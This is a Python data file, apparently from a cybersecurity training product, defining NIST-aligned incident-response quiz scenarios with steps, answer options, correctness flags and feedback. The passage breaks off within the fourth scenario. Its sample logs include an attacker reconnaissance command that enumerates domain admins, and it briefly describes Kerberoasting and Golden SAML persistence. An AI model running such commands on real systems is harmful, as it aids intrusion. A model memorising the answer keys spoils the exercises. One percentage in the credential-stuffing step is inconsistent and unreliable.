"""
Guardelio — Network Intrusion & APT Scenarios (S-APT-01 to S-APT-05)
NIST SP 800-61 Aligned Incident Response Simulations
"""

# ═══════════════════════════════════════════════════════════════════════════════
# S-APT-01: Lateral Movement Detected in Corporate Network (Beginner, 5 steps, 3 decisions)
# ═══════════════════════════════════════════════════════════════════════════════

S_APT_01_OBJECTIVES = [
    (1, 'Identify lateral movement techniques (PsExec, SMB, WMI execution) within internal network segments.'),
    (2, 'Isolate compromised endpoints without disrupting uninfected corporate systems.'),
    (3, 'Hunt for secondary infected hosts using IoCs (Indicators of Compromise).'),
]

S_APT_01_STEPS = [
    {
        'step_number': 1,
        'title': 'The PsExec Service Alert',
        'situation_text': (
            'At 11:30 AM, the EDR (Endpoint Detection and Response) console at DataBridge Consulting alerts on high-severity activity:\n\n'
            '- Workstation `WS-MKT-04` (Marketing Department) initiated multiple SMB connections on port 445 '
            'to finance servers `FS-FIN-01`, `FS-FIN-02`, and `DB-CORE-01`.\n'
            '- A remote service named `PSEXESVC.exe` was remotely installed and executed on all three target servers.\n'
            '- The account used for the remote execution is the built-in local administrator account (`.\\Administrator`).\n\n'
            'You are the Junior Threat Hunter assigned to investigate.'
        ),
        'nist_phase': 'preparation',
        'step_type': 'info',
        'is_final_step': False,
        'options': [],
    },
    {
        'step_number': 2,
        'title': 'Windows Security Event Log Analysis',
        'situation_text': (
            'You query Windows Security Event Logs across `FS-FIN-01` and `WS-MKT-04`. You observe:\n\n'
            '- Event ID 4624 (Successful Logon): `Logon Type: 3 (Network Logon)`, `Logon Process: NtLmSsp`, `Workstation Name: WS-MKT-04`\n'
            '- Event ID 7045 (Service Creation): `Service Name: PSEXESVC`, `Image Path: %SystemRoot%\\PSEXESVC.exe`\n'
            '- Event ID 4688 (Process Creation): `cmd.exe /c whoami.exe & net group "Domain Admins" /domain`\n\n'
            'What specific adversary phase and technique is occurring?'
        ),
        'nist_phase': 'detection',
        'step_type': 'decision',
        'is_final_step': False,
        'options': [
            {
                'text': 'Internal Lateral Movement via Pass-the-Hash / SMB using PsExec to spread from a compromised marketing endpoint to critical finance servers.',
                'is_correct': True,
                'xp': 20,
                'feedback': (
                    'Correct. PsExec utilizes SMB (TCP port 445) and the Windows Service Control Manager to remotely execute commands on target systems. '
                    'Using local administrator NTLM hashes across multiple endpoints is classic lateral movement (MITRE ATT&CK T1021.002).'
                ),
                'consequence': 'positive',
                'display_order': 1,
            },
            {
                'text': 'A regular Windows automated security update restarting services.',
                'is_correct': False,
                'xp': 0,
                'feedback': (
                    'Incorrect. Windows Update does not use PsExec or execute reconnaissance commands like `net group "Domain Admins" /domain`.'
                ),
                'consequence': 'negative',
                'display_order': 2,
            },
            {
                'text': 'A DDoS volumetric flood saturating the internet firewall.',
                'is_correct': False,
                'xp': 0,
                'feedback': (
                    'Incorrect. The activity is internal east-west lateral movement inside the LAN, not an inbound volumetric DDoS flood.'
                ),
                'consequence': 'negative',
                'display_order': 3,
            },
        ],
    },
    {
        'step_number': 3,
        'title': 'Endpoint Network Containment & Isolation',
        'situation_text': (
            'The attacker has successfully established execution on `WS-MKT-04`, `FS-FIN-01`, and `FS-FIN-02`. '
            'They are actively enumerating Active Directory domain controllers.\n\n'
            'What is your immediate containment action?'
        ),
        'nist_phase': 'containment',
        'step_type': 'decision',
        'is_final_step': False,
        'options': [
            {
                'text': 'Issue an EDR network isolation command on `WS-MKT-04`, `FS-FIN-01`, and `FS-FIN-02` (severing all network traffic while maintaining EDR management tunnel) to halt lateral spread instantly.',
                'is_correct': True,
                'xp': 20,
                'feedback': (
                    'Correct. EDR host isolation severs all internal and external network connectivity on compromised machines '
                    'while keeping the security management channel open for memory dumps and remediation.'
                ),
                'consequence': 'positive',
                'display_order': 1,
            },
            {
                'text': 'Power down and pull the power cables from all three servers immediately.',
                'is_correct': False,
                'xp': 0,
                'feedback': (
                    'Incorrect. Hard power cut destroys volatile RAM evidence containing the attacker\'s memory-resident tools and C2 connections.'
                ),
                'consequence': 'negative',
                'display_order': 2,
            },
            {
                'text': 'Send an instant message to the marketing employee asking them if they ran PsExec.',
                'is_correct': False,
                'xp': 0,
                'feedback': (
                    'Incorrect. The marketing employee is unaware that their workstation was compromised; waiting for a chat response delays critical containment.'
                ),
                'consequence': 'negative',
                'display_order': 3,
            },
        ],
    },
    {
        'step_number': 4,
        'title': 'Eradicating Local Admin Hash Reuse (LAPS)',
        'situation_text': (
            'The initial compromised marketing machine and target finance servers are isolated. '
            'You investigate why the attacker was able to use the same local `.\\Administrator` password across all machines.\n\n'
            'You find that the IT department used a static "golden image" password across all 500 corporate endpoints.\n\n'
            'What enterprise solution permanently eradicates lateral movement via shared local admin passwords?'
        ),
        'nist_phase': 'eradication',
        'step_type': 'decision',
        'is_final_step': False,
        'options': [
            {
                'text': 'Deploy Microsoft Local Administrator Password Solution (Windows LAPS) to automatically generate unique, complex, rotating passwords for the local administrator account on every individual computer.',
                'is_correct': True,
                'xp': 20,
                'feedback': (
                    'Correct. Windows LAPS randomizes the local administrator password on every endpoint, securely storing the passwords in Active Directory / Azure AD. '
                    'Even if an attacker dumps one machine\'s local hash, it cannot be reused on any other workstation or server.'
                ),
                'consequence': 'positive',
                'display_order': 1,
            },
            {
                'text': 'Change the shared local administrator password to `Spring2026!` on all 500 machines.',
                'is_correct': False,
                'xp': 0,
                'feedback': (
                    'Incorrect. Setting another static shared password leaves the entire enterprise completely vulnerable to Pass-the-Hash lateral movement.'
                ),
                'consequence': 'negative',
                'display_order': 2,
            },
            {
                'text': 'Disable all firewalls between the marketing and finance VLANs.',
                'is_correct': False,
                'xp': 0,
                'feedback': (
                    'Incorrect. Removing network firewalls completely breaks network segmentation and accelerates attacker lateral movement.'
                ),
                'consequence': 'negative',
                'display_order': 3,
            },
        ],
    },
    {
        'step_number': 5,
        'title': 'Post-Incident Review & Network Segmentation',
        'situation_text': (
            'The lateral movement attack was successfully contained before domain administrator credentials could be compromised. '
            'The affected endpoints were reimaged, Windows LAPS was deployed enterprise-wide, and finance servers were placed in an isolated VLAN.\n\n'
            'LESSONS LEARNED:\n\n'
            'ATTACK PROFILE: Lateral Movement via Pass-the-Hash and PsExec using shared local administrator credentials.\n\n'
            'NIST PHASES COMPLETED:\n'
            '- Preparation: EDR sensor deployment across all corporate subnets\n'
            '- Detection & Analysis: Windows Event 4624/7045 log correlation, PsExec execution detection\n'
            '- Containment: EDR network host isolation on source and target endpoints\n'
            '- Eradication: Local Administrator Password Solution (LAPS) enterprise deployment\n'
            '- Post-Incident Activity: Internal firewall rule hardening\n\n'
            'SECURITY ENHANCEMENTS IMPLEMENTED:\n'
            '1. Deployed Microsoft Windows LAPS across all 500 workstations and member servers.\n'
            '2. Enforced internal firewall rules blocking inbound SMB (TCP 445) and RPC between workstation subnets.\n'
            '3. Configured automated EDR alert triggers for any execution of `PSEXESVC.exe` or remote service creation.'
        ),
        'nist_phase': 'post_incident',
        'step_type': 'info',
        'is_final_step': True,
        'options': [],
    },
]


# ═══════════════════════════════════════════════════════════════════════════════
# S-APT-02: C2 Beaconing to Suspicious Domain (Intermediate, 6 steps, 4 decisions)
# ═══════════════════════════════════════════════════════════════════════════════

S_APT_02_OBJECTIVES = [
    (1, 'Detect Command & Control (C2) beaconing patterns, jitter algorithms, and Domain Generation Algorithm (DGA) queries.'),
    (2, 'Perform volatile memory forensics on compromised hosts to extract C2 configuration profiles.'),
    (3, 'Block C2 communication at DNS firewall / proxy layers and eradicate memory-injected payloads.'),
]

S_APT_02_STEPS = [
    {
        'step_number': 1,
        'title': 'The Periodic DNS Query Alert',
        'situation_text': (
            'At 14:00 on a Tuesday, network threat analytics at Meridian Telecom generates a high-severity alert:\n\n'
            '- Workstation `ENG-PC-12` (Engineering Department) is querying strange, pseudo-random domains every 60 seconds (±5s jitter).\n'
            '- Examples: `x7k9m2p1.biz`, `w3v8q1r9.biz`, `z2b4n7m9.biz`.\n'
            '- Total queries in 24 hours: 1,440 continuous DNS requests with matching outbound HTTPS connections to an external IP in Moldova.\n\n'
            'You are the SOC Tier 2 Analyst assigned to investigate.'
        ),
        'nist_phase': 'preparation',
        'step_type': 'info',
        'is_final_step': False,
        'options': [],
    },
    {
        'step_number': 2,
        'title': 'DGA & Traffic Jitter Fingerprinting',
        'situation_text': (
            'You inspect the DNS query telemetry and WHOIS domain records for `*.biz`. You discover:\n\n'
            '- High-entropy domain names generated via a Domain Generation Algorithm (DGA).\n'
            '- The domains were registered only 48 hours ago using anonymous registrar privacy shields.\n'
            '- Traffic periodicity: Periodic heartbeat connection every 60 seconds with intentional 10% randomization (jitter) to evade static threshold alarms.\n\n'
            'What specific adversary tactic does this behavior represent?'
        ),
        'nist_phase': 'detection',
        'step_type': 'decision',
        'is_final_step': False,
        'options': [
            {
                'text': 'Command and Control (C2) beaconing utilizing Domain Generation Algorithms (DGA) and jitter to maintain covert remote control of the compromised host.',
                'is_correct': True,
                'xp': 25,
                'feedback': (
                    'Correct. C2 frameworks (e.g. Cobalt Strike, Mythic) employ periodic beaconing with jitter and DGA fallbacks '
                    'to check in with adversary servers for instructions while blending into standard web traffic.'
                ),
                'consequence': 'positive',
                'display_order': 1,
            },
            {
                'text': 'A web developer testing standard REST API endpoints for an internal mobile app.',
                'is_correct': False,
                'xp': 0,
                'feedback': (
                    'Incorrect. Internal app development does not query high-entropy DGA domains registered 48 hours ago in Moldova with 60s jittered beacons.'
                ),
                'consequence': 'negative',
                'display_order': 2,
            },
            {
                'text': 'An NTP clock synchronization query.',
                'is_correct': False,
                'xp': 0,
                'feedback': (
                    'Incorrect. NTP uses UDP port 123 to pool.ntp.org servers, not HTTPS to randomized DGA domains.'
                ),
                'consequence': 'negative',
                'display_order': 3,
            },
        ],
    },
    {
        'step_number': 3,
        'title': 'DNS Sinkholing & Network Containment',
        'situation_text': (
            'The active C2 beaconing must be severed immediately to prevent the attacker from executing remote commands '
            'or exfiltrating engineering schematics.\n\n'
            'What network containment action immediately neutralizes the DGA C2 channel enterprise-wide?'
        ),
        'nist_phase': 'containment',
        'step_type': 'decision',
        'is_final_step': False,
        'options': [
            {
                'text': 'Sinkhole the malicious DGA domains and destination IP at the internal DNS resolvers and boundary proxy/firewall, and isolate `ENG-PC-12` via EDR.',
                'is_correct': True,
                'xp': 25,
                'feedback': (
                    'Correct. DNS sinkholing redirects malicious DGA lookups to an internal loopback/monitoring IP (0.0.0.0 / sinkhole), '
                    'instantly cutting C2 communication enterprise-wide and identifying any other infected hosts attempting to beacon.'
                ),
                'consequence': 'positive',
                'display_order': 1,
            },
            {
                'text': 'Send an email to the registrar in Moldova asking them to close the domains next week.',
                'is_correct': False,
                'xp': 0,
                'feedback': (
                    'Incorrect. International registrar abuse requests take days or weeks; immediate technical sinkholing on internal resolvers is required.'
                ),
                'consequence': 'negative',
                'display_order': 2,
            },
            {
                'text': 'Turn off the internal DNS servers for the entire company.',
                'is_correct': False,
                'xp': 0,
                'feedback': (
                    'Incorrect. Disabling all internal DNS crashes all corporate applications and internet access.'
                ),
                'consequence': 'negative',
                'display_order': 3,
            },
        ],
    },
    {
        'step_number': 4,
        'title': 'Volatile Memory Forensics & Process Injection',
        'situation_text': (
            'The host `ENG-PC-12` is isolated and C2 DNS traffic is sinkholed. '
            'An antivirus disk scan on the machine reports "0 files infected."\n\n'
            'You capture a live volatile RAM dump using WinPmem and analyze active processes with Volatility:\n'
            '- Process `svchost.exe` (PID 3420) has unbacked executable memory regions with `PAGE_EXECUTE_READWRITE` permissions.\n'
            '- Injected DLL payload matches Cobalt Strike Beacon reflective loader.\n\n'
            'Why did standard antivirus fail to detect the malware on disk?'
        ),
        'nist_phase': 'detection',
        'step_type': 'decision',
        'is_final_step': False,
        'options': [
            {
                'text': 'The attacker used fileless memory process injection (Reflective DLL Injection / Process Hollowing) directly into a legitimate system process (`svchost.exe`), leaving no executable files on disk.',
                'is_correct': True,
                'xp': 25,
                'feedback': (
                    'Correct. Fileless malware injects payload shellcode directly into the memory space of trusted Windows processes, '
                    'evading static signature-based on-disk antivirus scanners.'
                ),
                'consequence': 'positive',
                'display_order': 1,
            },
            {
                'text': 'The antivirus software was expired by 5 years.',
                'is_correct': False,
                'xp': 0,
                'feedback': (
                    'Incorrect. Fileless memory injection evades modern up-to-date antivirus because no malware binary exists on the file system.'
                ),
                'consequence': 'negative',
                'display_order': 2,
            },
            {
                'text': 'The process `svchost.exe` is a standard Windows file that can never contain malware.',
                'is_correct': False,
                'xp': 0,
                'feedback': (
                    'Incorrect. Legitimate Windows system processes are frequently targeted by adversaries for process injection and masquerading.'
                ),
                'consequence': 'negative',
                'display_order': 3,
            },
        ],
    },
    {
        'step_number': 5,
        'title': 'Eradication & Golden Image Rebuild',
        'situation_text': (
            'Process injection is confirmed. You extract the Cobalt Strike C2 configuration metadata from RAM: '
            'Watermark ID, public key, and secondary fallback IP addresses.\n\n'
            'What is the mandatory eradication procedure for an endpoint compromised by memory-injected C2 frameworks?'
        ),
        'nist_phase': 'eradication',
        'step_type': 'decision',
        'is_final_step': False,
        'options': [
            {
                'text': 'Wipe and reimage the endpoint from a trusted golden image, revoke and rotate all user and machine credentials used on the host, and block all extracted fallback C2 IP addresses on boundary firewalls.',
                'is_correct': True,
                'xp': 25,
                'feedback': (
                    'Correct. Full re-imaging from a trusted baseline eliminates any hidden persistence mechanisms or rootkits, '
                    'while credential rotation and perimeter IP blocking permanently sever the adversary’s footholds.'
                ),
                'consequence': 'positive',
                'display_order': 1,
            },
            {
                'text': 'Kill the `svchost.exe` process using Task Manager and continue using the computer.',
                'is_correct': False,
                'xp': 0,
                'feedback': (
                    'Incorrect. Killing a critical system process crashes Windows and does not remove persistent startup registry hooks or scheduled tasks.'
                ),
                'consequence': 'negative',
                'display_order': 2,
            },
            {
                'text': 'Change the desktop wallpaper to a warning sign.',
                'is_correct': False,
                'xp': 0,
                'feedback': (
                    'Incorrect. Completely useless against an active advanced persistent threat.'
                ),
                'consequence': 'negative',
                'display_order': 3,
            },
        ],
    },
    {
        'step_number': 6,
        'title': 'Post-Incident Review & Memory Defense Strategy',
        'situation_text': (
            'The Cobalt Strike beacon was eradicated, the endpoint reimaged, and extracted C2 IoCs blocked across all telecom firewalls. '
            'Zero data exfiltration occurred.\n\n'
            'LESSONS LEARNED:\n\n'
            'ATTACK PROFILE: Cobalt Strike C2 Jittered Beaconing & Fileless In-Memory Process Injection.\n\n'
            'NIST PHASES COMPLETED:\n'
            '- Preparation: Network telemetry and DGA anomaly detection rules\n'
            '- Detection & Analysis: Beaconing periodicity/jitter calculation, Volatility memory injection identification\n'
            '- Containment: Enterprise DNS sinkholing, EDR host isolation\n'
            '- Eradication: Clean baseline re-imaging, fallback C2 IP perimeter blocking\n'
            '- Post-Incident Activity: Process injection behavioral protection\n\n'
            'STRATEGIC HARDENING ACTIONS:\n'
            '1. Enabled Microsoft Defender Exploit Guard and Attack Surface Reduction (ASR) rules to block process injection into system binaries.\n'
            '2. Configured DNS RPZ (Response Policy Zones) to automatically block high-entropy DGA domains.\n'
            '3. Enforced TLS inspection on all outbound egress traffic to detect encrypted C2 handshakes.'
        ),
        'nist_phase': 'post_incident',
        'step_type': 'info',
        'is_final_step': True,
        'options': [],
    },
]


# ═══════════════════════════════════════════════════════════════════════════════
# S-APT-03: Nation-State APT Campaign Against Energy Sector (Advanced, 7 steps, 5 decisions)
# ═══════════════════════════════════════════════════════════════════════════════

S_APT_03_OBJECTIVES = [
    (1, 'Map threat actor TTPs (Tactics, Techniques, and Procedures) to the MITRE ATT&CK framework.'),
    (2, 'Identify advanced persistence mechanisms (Kerberoasting, WMI event subscriptions, Golden SAML).'),
    (3, 'Execute an enterprise-wide synchronized eviction operation under coordinated timing.'),
    (4, 'Harden Operational Technology (OT) network air-gaps and critical infrastructure control systems.'),
]

S_APT_03_STEPS = [
    {
        'step_number': 1,
        'title': 'The CISA Critical Infrastructure Advisory',
        'situation_text': (
            'At 08:00 on Monday, the Cyber Defence Operations Center at NationalGrid receives an emergency flash advisory '
            'from CISA and the NCSC. The advisory warns that a sophisticated state-sponsored threat group (APT29 / Cozy Bear) '
            'is actively targeting energy sector electrical transmission substations.\n\n'
            'Simultaneously, internal SIEM correlation detects Kerberoasting ticket extraction requests (Event ID 4769) '
            'targeting high-privilege service accounts connected to the SCADA Energy Management System.\n\n'
            'You are the Senior Threat Intelligence Analyst leading the defense.'
        ),
        'nist_phase': 'preparation',
        'step_type': 'info',
        'is_final_step': False,
        'options': [],
    },
    {
        'step_number': 2,
        'title': 'Kerberoasting & Identity Telemetry Analysis',
        'situation_text': (
            'You query Active Directory Kerberos ticket requests for the past 48 hours. You observe:\n\n'
            '- Multiple TGS requests using legacy RC4 encryption (`Ticket_Encryption_Type: 0x17`) for service accounts `svc-scada-admin` and `svc-substation-mgmt`.\n'
            '- The requests originated from a compromised HVAC management server (`HVAC-GW-02`) on the corporate perimeter.\n'
            '- The attacker extracted Service Principal Name (SPN) hashes for offline cracking.\n\n'
            'What specific adversary technique and goal are in progress?'
        ),
        'nist_phase': 'detection',
        'step_type': 'decision',
        'is_final_step': False,
        'options': [
            {
                'text': 'Kerberoasting (MITRE ATT&CK T1558.003) designed to steal Service Principal Name password hashes for offline cracking to achieve domain-wide privilege escalation into energy grid controls.',
                'is_correct': True,
                'xp': 30,
                'feedback': (
                    'Correct. Kerberoasting requests Kerberos Service Tickets (TGS) for accounts with SPNs. '
                    'Adversaries crack the RC4 ticket hashes offline to obtain plaintext service account passwords and escalate privileges into critical grid infrastructure.'
                ),
                'consequence': 'positive',
                'display_order': 1,
            },
            {
                'text': 'A simple denial of service attack on the HVAC heating system.',
                'is_correct': False,
                'xp': 0,
                'feedback': (
                    'Incorrect. Kerberoasting is a credential access and privilege escalation technique targeting Active Directory identity stores, not a simple thermostat glitch.'
                ),
                'consequence': 'negative',
                'display_order': 2,
            },
            {
                'text': 'Standard Kerberos ticket renewals for regular Windows desktop users.',
                'is_correct': False,
                'xp': 0,
                'feedback': (
                    'Incorrect. Legitimate renewals use AES-256 encryption for normal user accounts, not anomalous RC4 bulk requests for privileged SCADA service accounts.'
                ),
                'consequence': 'negative',
                'display_order': 3,
            },
        ],
    },
    {
        'step_number': 3,
        'title': 'Uncovering Stealth WMI Persistence',
        'situation_text': (
            'You perform deep hunting across Domain Controllers and the HVAC gateway. In addition to Kerberoasting, you uncover:\n\n'
            '- A permanent WMI Event Subscription (`__EventFilter` -> `__CommandLineEventConsumer`) set to trigger every time the system starts.\n'
            '- It executes an obfuscated PowerShell script downloading payloads from an encrypted Azure blob.\n'
            '- A forged SAML token signing certificate was imported into Active Directory Federation Services (AD FS) (Golden SAML attack).\n\n'
            'What does this level of multi-vector persistence demonstrate?'
        ),
        'nist_phase': 'detection',
        'step_type': 'decision',
        'is_final_step': False,
        'options': [
            {
                'text': 'A deeply entrenched, resilient Advanced Persistent Threat (APT) with redundant persistence across both endpoint WMI and identity federations (Golden SAML).',
                'is_correct': True,
                'xp': 30,
                'feedback': (
                    'Correct. Combining WMI event subscriptions with Golden SAML identity forging allows the adversary to regenerate access '
                    'even if passwords are changed or endpoints are rebooted. This requires a synchronized enterprise eviction plan.'
                ),
                'consequence': 'positive',
                'display_order': 1,
            },
            {
                'text': 'A script kiddie running basic automated malware from YouTube.',
                'is_correct': False,
                'xp': 0,
                'feedback': (
                    'Incorrect. Golden SAML and WMI persistence targeting critical infrastructure are the hallmarks of sophisticated state-sponsored APT campaigns.'
                ),
                'consequence': 'negative',
                'display_order': 2,
            },
            {
                'text': 'An authorized IT system management update deployed by Microsoft.',
                'is_correct': False,
                'xp': 0,
                'feedback': (
                    'Incorrect. Microsoft updates do not deploy obfuscated reverse shells via custom WMI filters or forge Golden SAML certificates.'
                ),
                'consequence': 'negative',
                'display_order': 3,
            },
        ],
    },
    {
        'step_number': 4,
        'title': 'Emergency IT/OT Air-Gap Severance',
        'situation_text': (
            'The adversary has compromised IT identity stores and is attempting to pivot across network firewalls '
            'into the Operational Technology (OT) SCADA substation control network.\n\n'
            'What is the immediate critical containment action to protect the national power grid?'
        ),
        'nist_phase': 'containment',
        'step_type': 'decision',
        'is_final_step': False,
        'options': [
            {
                'text': 'Immediately sever all inter-network routing and firewall conduits between the IT enterprise network and the OT SCADA network, placing electrical substations into autonomous "Island Mode".',
                'is_correct': True,
                'xp': 30,
                'feedback': (
                    'Correct. In critical infrastructure emergencies, physically and logically severing the IT/OT bridge (enforcing pure air-gap Island Mode) '
                    'prevents the digital intrusion from crossing into physical electrical switching substations.'
                ),
                'consequence': 'positive',
                'display_order': 1,
            },
            {
                'text': 'Leave the IT/OT bridge wide open so engineers can monitor the substation from home on unmanaged laptops.',
                'is_correct': False,
                'xp': 0,
                'feedback': (
                    'Incorrect. Leaving the bridge open allows the APT actor to push malicious firmware directly to substation electrical breakers.'
                ),
                'consequence': 'negative',
                'display_order': 2,
            },
            {
                'text': 'Shut down all electrical power to 10 million homes nationwide immediately.',
                'is_correct': False,
                'xp': 0,
                'feedback': (
                    'Incorrect. Substations operate safely in autonomous Island Mode; completely killing national power is totally unnecessary and catastrophic.'
                ),
                'consequence': 'negative',
                'display_order': 3,
            },
        ],
    },
    {
        'step_number': 5,
        'title': 'Synchronized Enterprise Eviction Operation',
        'situation_text': (
            'OT substations are isolated in safe Island Mode. You must now plan and execute the synchronized eradication/eviction operation '
            'across the IT enterprise so the adversary cannot pivot or re-enter.\n\n'
            'What coordinated steps constitute a comprehensive APT eviction?'
        ),
        'nist_phase': 'eradication',
        'step_type': 'decision',
        'is_final_step': False,
        'options': [
            {
                'text': 'Execute synchronized remediation during a coordinated maintenance window: rotate the Active Directory KRBTGT password twice (invalidating Golden Tickets), regenerate AD FS token signing certificates, purge all WMI subscriptions, and rotate all service account keys.',
                'is_correct': True,
                'xp': 30,
                'feedback': (
                    'Correct. APT eviction must be executed in a single coordinated strike. Rotating KRBTGT twice destroys forged Kerberos tickets, '
                    'rotating AD FS certificates kills Golden SAML footholds, and purging WMI removes persistence.'
                ),
                'consequence': 'positive',
                'display_order': 1,
            },
            {
                'text': 'Change one user password per week over the next 6 months to minimize disruption.',
                'is_correct': False,
                'xp': 0,
                'feedback': (
                    'Incorrect. Incremental, piecemeal remediation alerts the APT group, allowing them to plant new backdoors faster than they are removed.'
                ),
                'consequence': 'negative',
                'display_order': 2,
            },
            {
                'text': 'Format the hard drive of the HVAC server and consider the incident resolved.',
                'is_correct': False,
                'xp': 0,
                'feedback': (
                    'Incorrect. Wiping only one server leaves AD FS Golden SAML and Kerberos ticket persistence active across the entire enterprise.'
                ),
                'consequence': 'negative',
                'display_order': 3,
            },
        ],
    },
    {
        'step_number': 6,
        'title': 'Post-Eviction Verification & OT Bridge Re-Establishment',
        'situation_text': (
            'The eviction commands were executed simultaneously across all domain controllers and identity providers.\n\n'
            'How do you forensically verify the enterprise is clean before reconnecting monitored OT telemetry links?'
        ),
        'nist_phase': 'recovery',
        'step_type': 'decision',
        'is_final_step': False,
        'options': [
            {
                'text': 'Deploy continuous threat hunting scripts across all hosts, verify zero anomalous Kerberos/SAML authentications, inspect deep packet inspection (DPI) sensors on unidirectional data diodes, and restore OT links through unidirectional gateways only.',
                'is_correct': True,
                'xp': 30,
                'feedback': (
                    'Correct. Using hardware data diodes (unidirectional gateways) ensures OT telemetry can be sent to IT monitoring systems '
                    'without any physical possibility of IT network traffic flowing back into OT control networks.'
                ),
                'consequence': 'positive',
                'display_order': 1,
            },
            {
                'text': 'Turn off all firewalls and assume the eviction worked.',
                'is_correct': False,
                'xp': 0,
                'feedback': (
                    'Incorrect. Disabling firewalls destroys all security boundaries.'
                ),
                'consequence': 'negative',
                'display_order': 2,
            },
            {
                'text': 'Ask the CISA advisory team to manage all substation switches for you.',
                'is_correct': False,
                'xp': 0,
                'feedback': (
                    'Incorrect. Government advisory agencies provide intelligence and guidance; operational grid management remains the utility’s direct responsibility.'
                ),
                'consequence': 'neutral',
                'display_order': 3,
            },
        ],
    },
    {
        'step_number': 7,
        'title': 'Post-Incident Review & National Grid Resilience',
        'situation_text': (
            'The nation-state APT campaign was completely neutralized. Electrical transmission substations continued '
            'operating without a single second of blackout, the adversary was fully evicted from IT identity systems, and CISA was briefed.\n\n'
            'LESSONS LEARNED:\n\n'
            'THREAT ACTOR: Nation-State APT Group executing multi-phase Kerberoasting, Golden SAML, and WMI persistence targeting energy infrastructure.\n\n'
            'NIST PHASES COMPLETED:\n'
            '- Preparation: CISA/NCSC threat intelligence advisory integration\n'
            '- Detection & Analysis: RC4 Kerberoasting detection, Golden SAML / WMI persistence mapping\n'
            '- Containment: Immediate IT/OT air-gap severance (Substation Island Mode)\n'
            '- Eradication: Synchronized double KRBTGT rotation, AD FS certificate regeneration, WMI purge\n'
            '- Recovery: Unidirectional data diode deployment and clean network re-establishment\n'
            '- Post-Incident Activity: Critical infrastructure regulatory compliance filing\n\n'
            'STRATEGIC GRID DEFENSE UPGRADES:\n'
            '1. Enforced AES-256 Kerberos encryption mandatory system-wide, disabling legacy RC4.\n'
            '2. Installed hardware Data Diodes on all IT/OT boundaries, making inbound OT network penetration physically impossible.\n'
            '3. Deployed 24/7 dedicated Threat Hunting and Honeytokens inside Active Directory to trap future Kerberoasting attempts in seconds.'
        ),
        'nist_phase': 'post_incident',
        'step_type': 'info',
        'is_final_step': True,
        'options': [],
    },
]


# ═══════════════════════════════════════════════════════════════════════════════
# S-APT-04: Credential Stuffing on VPN Gateway (Beginner, 5 steps, 3 decisions)
# ═══════════════════════════════════════════════════════════════════════════════

S_APT_04_OBJECTIVES = [
    (1, 'Analyze authentication logs to detect distributed credential stuffing attacks.'),
    (2, 'Apply geo-blocking, IP reputation filtering, and adaptive rate limiting.'),
    (3, 'Enforce mandatory Multi-Factor Authentication (MFA) and compromised password screening.'),
]

S_APT_04_STEPS = [
    {
        'step_number': 1,
        'title': 'The VPN Gateway Authentication Storm',
        'situation_text': (
            'At 03:00 UTC on Sunday, the enterprise VPN gateway at Apex Pharmaceuticals experiences an extreme authentication surge:\n\n'
            '- Login attempts jump from a normal baseline of 20 attempts/hour to over 50,000 attempts in 30 minutes.\n'
            '- Overall authentication failure rate spikes to 99.2%.\n'
            '- The attempts target thousands of employee email addresses in alphabetical order.\n\n'
            'You are the Identity Security Analyst on on-call incident response duty.'
        ),
        'nist_phase': 'preparation',
        'step_type': 'info',
        'is_final_step': False,
        'options': [],
    },
    {
        'step_number': 2,
        'title': 'Attack Vector & IP Rotation Analysis',
        'situation_text': (
            'You inspect the VPN gateway authentication logs and RADIUS telemetry. You observe:\n\n'
            '- Source IPs: Over 4,500 distinct residential IP addresses distributed globally (residential proxy botnet).\n'
            '- Request rate: Each individual IP attempts only 2–3 logins every 5 minutes to evade simple single-IP rate limits.\n'
            '- Passwords tested: Common passwords and credentials originating from known historical third-party data breaches (e.g. RockYou, Compilation of Many Breaches).\n\n'
            'What specific type of identity attack is occurring?'
        ),
        'nist_phase': 'detection',
        'step_type': 'decision',
        'is_final_step': False,
        'options': [
            {
                'text': 'A distributed Credential Stuffing attack using automated botnets and breached password lists to compromise accounts that reuse passwords.',
                'is_correct': True,
                'xp': 20,
                'feedback': (
                    'Correct. Credential stuffing uses automated tools and rotating proxy botnets to test massive lists of leaked username/password pairs '
                    'across targeted corporate portals, exploiting user password reuse.'
                ),
                'consequence': 'positive',
                'display_order': 1,
            },
            {
                'text': 'A single user who forgot their password and is trying to remember it.',
                'is_correct': False,
                'xp': 0,
                'feedback': (
                    'Incorrect. A single user does not generate 50,000 requests from 4,500 rotating residential IP addresses in alphabetical order.'
                ),
                'consequence': 'negative',
                'display_order': 2,
            },
            {
                'text': 'A physical fiber optic cable cut in the ocean.',
                'is_correct': False,
                'xp': 0,
                'feedback': (
                    'Incorrect. A cable cut causes a drop in traffic, not a surge of 50,000 automated login attempts.'
                ),
                'consequence': 'negative',
                'display_order': 3,
            },
        ],
    },
    {
        'step_number': 3,
        'title': 'Immediate Edge Containment & Rate Limiting',
        'situation_text': (
            'The automated attack is continuing at 1,500 requests per minute, consuming VPN gateway CPU and risking account lockouts '
            'for thousands of legitimate employees.\n\n'
            'What is your immediate containment action on the VPN gateway and WAF?'
        ),
        'nist_phase': 'containment',
        'step_type': 'decision',
        'is_final_step': False,
        'options': [
            {
                'text': 'Enable CAPTCHA challenges on the VPN login interface, deploy IP reputation threat intelligence blocking, and enforce adaptive behavioral rate limiting.',
                'is_correct': True,
                'xp': 20,
                'feedback': (
                    'Correct. Introducing CAPTCHA challenges immediately breaks automated credential stuffing bots that cannot solve challenges, '
                    'while IP reputation filters drop traffic from known residential proxy nodes.'
                ),
                'consequence': 'positive',
                'display_order': 1,
            },
            {
                'text': 'Delete the VPN gateway configuration and reinstall the operating system.',
                'is_correct': False,
                'xp': 0,
                'feedback': (
                    'Incorrect. Reinstalling the gateway takes hours of unnecessary downtime and does not stop the attack once the portal is re-enabled.'
                ),
                'consequence': 'negative',
                'display_order': 2,
            },
            {
                'text': 'Allow all logins without passwords to reduce server CPU load.',
                'is_correct': False,
                'xp': 0,
                'feedback': (
                    'Incorrect. Disabling authentication gives the attackers immediate full access to internal pharmaceutical trade secrets.'
                ),
                'consequence': 'negative',
                'display_order': 3,
            },
        ],
    },
    {
        'step_number': 4,
        'title': 'Identifying & Securing Compromised Accounts',
        'situation_text': (
            'CAPTCHA challenges drop 99.8% of the botnet traffic. You now review the logs for the 0.8% of attempts that preceded containment.\n\n'
            'You discover that 14 user accounts registered a "Successful Authentication" during the attack because those employees reused breached personal passwords.\n\n'
            'What immediate remediation must be executed for the 14 accounts?'
        ),
        'nist_phase': 'eradication',
        'step_type': 'decision',
        'is_final_step': False,
        'options': [
            {
